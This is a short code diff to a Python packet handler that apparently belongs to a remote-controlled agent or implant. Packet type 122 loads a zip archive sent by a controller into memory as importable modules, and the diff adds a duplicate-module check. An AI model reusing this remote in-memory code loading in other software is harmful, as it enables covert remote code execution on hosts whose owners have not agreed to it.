@@ -449,9 +449,12 @@ def process_packet(packetType, data, resultID):
 
         zdata = dec_data['data']
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        moduleRepo[fileName] = zf
-        install_hook(fileName)
-        send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+        if fileName in moduleRepo.keys():
+            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
+        else:
+            moduleRepo[fileName] = zf
+            install_hook(fileName)
+            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
 
     elif packetType == 123:
         #view loaded modules
